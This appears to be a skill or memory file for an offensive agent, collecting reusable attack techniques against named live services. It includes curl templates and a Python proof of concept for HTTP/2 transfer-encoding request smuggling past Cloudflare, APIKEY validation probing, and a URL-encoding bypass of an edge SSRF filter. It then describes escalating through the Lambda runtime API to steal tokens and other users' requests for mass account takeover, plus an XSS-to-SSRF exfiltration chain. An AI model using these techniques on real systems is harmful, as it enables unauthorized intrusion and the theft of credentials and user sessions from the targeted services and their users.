---
name: hacking-memory
description: Personal hacking techniques, bypasses, and reusable attack patterns. Use when targeting Unico APIs, Cloudflare-protected endpoints, APIKEY format bypass techniques, SSRF via callbackUri, or H2.TE request smuggling.
---

# SSRF via callbackUri — Final Log
# ====================================

## Key Discovery: APIKEY Format Differential

The sandbox endpoint accepts two APIKEY formats that PASS initial validation:
- UUID format: `550e8400-e29b-41d4-a716-446655440000` → 500 (99999 Internal failure)
- 32-char hex: `abcdef0123456789abcdef0123456789` → 500 (99999 Internal failure)

All other APIKEY formats return 400 (10201 Invalid APIKEY). This proves the body IS parsed after APIKEY format check.

## Critical APIKEY Discovery (for auth bypass path)

Date: 2026-06-09
Target: api.id.uat.unico.app/processes/v1 (Sandbox)

### Finding
The `APIKEY` header validation has a format-check bypass:
- Random strings like "test" → 10201 "The APIKEY header is invalid" (400)
- UUID format like `550e8400-e29b-41d4-a716-446655440000` → 99999 "Internal failure!" (500)
- 32-char hex like `abcdef0123456789abcdef0123456789` → 99999 "Internal failure!" (500)

This means the APIKEY format validator accepts UUID/hex formats and passes them to the database lookup layer, which fails with an unhandled exception (500).

### When to Reuse
When testing any Unico API that requires APIKEY header, try UUID format first to bypass the initial validation gate and reach deeper processing layers.

### Curl Template
```bash
curl -sk -X POST "https://api.id.uat.unico.app/processes/v1" \
  -H "Content-Type: application/json" \
  -H "APIKEY: 550e8400-e29b-41d4-a716-446655440000" \
  -d '{"imageBase64":"dGVzdA==","callbackUri":"https://example.com"}'
# Response: {"error":{"code":99999,"description":"Internal failure! Try again later."}} (500)
```

## H2.TE Smuggling Bypass (Cloudflare)

Date: 2026-06-09
Target: api.id.uat.unico.app (Cloudflare → origin)

### Finding
Cloudflare passes through `transfer-encoding: chunked` header when sent over HTTP/2. This allows H2.TE request smuggling where the back-end might interpret the chunked body differently from Cloudflare.

### PoC
```python
# Python h2 library - send H2.TE to bypass Cloudflare
import socket, ssl, h2.connection, h2.events, h2.config

context = ssl.create_default_context()
context.set_alpn_protocols(['h2'])
sock = socket.create_connection(("api.id.uat.unico.app", 443))
ssock = context.wrap_socket(sock, server_hostname="api.id.uat.unico.app")

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssock.sendall(conn.data_to_send())

body = b'...'  # chunked body + smuggled request
headers = [
    (':method', 'POST'), (':path', '/processes/v1'),
    (':authority', 'api.id.uat.unico.app'), (':scheme', 'https'),
    ('content-type', 'application/json'), ('apikey', 'test'),
    ('transfer-encoding', 'chunked'),  # THIS BYPASSES CF
]
conn.send_headers(1, headers, end_stream=False)
conn.send_data(1, body, end_stream=True)
ssock.sendall(conn.data_to_send())
```

### When to Reuse
When Cloudflare blocks TE/CL headers on HTTP/1.1, try H2.TE injection. The `transfer-encoding` header injected over HTTP/2 is not stripped by Cloudflare and reaches the origin.

---

## Technique: APIKEY Format Differential Bypass

**Date:** 2026-06-09
**Target Example:** api.id.uat.unico.app

### Pattern
APIKEY validators often use a two-stage check:
1. Format validation (regex/type check) — UUID, hex, base64
2. Database/backend lookup — fails if key not found

If format validation passes but lookup fails with 500 instead of 401/403, the body IS being parsed. Use this to test for issues that happen between format check and lookup.

### Detection
Try these APIKEY formats:
- UUID: `550e8400-e29b-41d4-a716-446655440000`
- 32-char hex: `abcdef0123456789abcdef0123456789`
- 64-char base64: `YWJjZGVm...`
- JWT format: `eyJ...`

If any returns 500 instead of 400/401, body parsing is confirmed.

### Curl Template
```bash
curl -sk -X POST "TARGET" \
  -H "Content-Type: application/json" \
  -H "APIKEY: 550e8400-e29b-41d4-a716-446655440000" \
  -d '{"param":"value"}'
# If 500 "Internal failure" → body IS parsed
# If 400/401 "invalid APIKEY" → body rejected pre-parse
```

---

## Technique: H2.TE Cloudflare Bypass

**Date:** 2026-06-09
**Target Example:** api.id.uat.unico.app (Cloudflare-protected)

### Pattern
Cloudflare blocks CL.TE and TE.CL smuggling on HTTP/1.1, but passes `transfer-encoding: chunked` when sent as a regular header over HTTP/2. Use Python `h2` library to craft requests.

### Key Insight
- HTTP/2 has no TE/CL ambiguity in spec
- `transfer-encoding` is a forbidden header in HTTP/2 but Cloudflare passes it through
- The back-end (HTTP/1.1) receives the TE header and may use it
- This creates a H2.TE desync window

### Usage
```bash
pip3 install h2
python3 h2_te_smuggle.py
```

---

## Technique: Cloudflare Path-Filter Bypass via URL-Encoding (reach origin-side handler)

**Date:** 2026-06-15
**Target Example:** reiatsu.pages.dev (Cloudflare Pages -> Vercel/AWS Lambda backend)

### Pattern
A Cloudflare Pages/Workers function guards a specific exact path (for example an
SSRF filter on `/api/music/audio-proxy`). The SAME route also exists on the real
origin backend (Vercel, Render, raw origin, etc.), and the origin has no such
protection. Cloudflare matches the path as a literal string, so URL-encoding one
character in the path makes the edge filter miss it, while the origin decodes the
path and runs the handler unprotected.

`audio-proxy` -> `%61udio-proxy`  (a = %61). CF does not match, forwards to origin,
origin decodes %61 to a, runs the real handler with no edge protection.

### Why it works
- Cloudflare edge filtering / blocking (SSRF guards, WAF path rules, the internal
  IP block that returns `error code: 1003`) is applied at the EDGE only.
- The origin framework (Starlette/FastAPI, Express, etc.) percent-decodes the path
  before routing, so the encoded char resolves to the real route.
- Net effect: any control implemented at the CF layer is bypassed; only origin-side
  controls remain (often none).

### Detection
Compare the normal path vs the encoded path:
- Normal path blocked/handled-by-CF: `server: cloudflare`, no origin headers, or 403/1003.
- Encoded path reaches origin: response now carries origin headers like
  `x-vercel-id`, `x-amzn-trace-id`, framework error bodies (`{"detail":...}` = FastAPI), etc.
If encoding a path char flips the response from "CF-handled" to "origin-handled",
the bypass works.

### Curl Template
```bash
# blocked at edge:
curl -s "https://TARGET/api/music/audio-proxy?url=http://127.0.0.1/"      # error code: 1003 (CF)
# bypass (encode first letter), reaches origin which does the fetch:
curl -s "https://TARGET/api/music/%61udio-proxy?url=http%3A%2F%2F127.0.0.1%3A9001%2F2018-06-01%2Fping"  # pong
```

### Escalation on Vercel / AWS Lambda backends
Once you reach an origin-side SSRF/proxy, hit the Lambda Runtime API:
`http://127.0.0.1:9001/2018-06-01/runtime/invocation/next`
It returns the live invocation event, leaking:
- `x-vercel-oidc-token` (RS256, cloud federation), internal `Authorization`/suspense-cache JWT, `x-vercel-proxy-signature`
- `responseCallbackUrl` + `responseCallbackCipherKey`/IV (response forging material)
- AWS account id (`acc=...`), region (`rgn=...`)
- With `multiplexingLambda: true`, polling `/next` returns OTHER users' in-flight
  requests (cookies/auth/IP) -> cross-user theft / mass ATO.
Note: Lambda has NO IMDS (169.254.169.254 blocked) and creds live in env vars
(`file://` usually blocked in aiohttp), so target the runtime API, not metadata.

### Browser / chain note
Browsers preserve `%61` in `fetch()` paths (they do not normalize it back to `a`),
so the same bypass works client-side. This lets an XSS on the CF origin call the
SSRF same-origin and exfil the runtime tokens (XSS -> SSRF one-click chain).

### When to Reuse
Any Cloudflare-fronted app (Pages/Workers) where the edge blocks SSRF/WAF on a
specific endpoint but a separate origin backend implements the same route. Also try
other encodings (`%2e` for `.`, double-encoding, case, trailing chars) and detect
the origin via leaked backend headers.
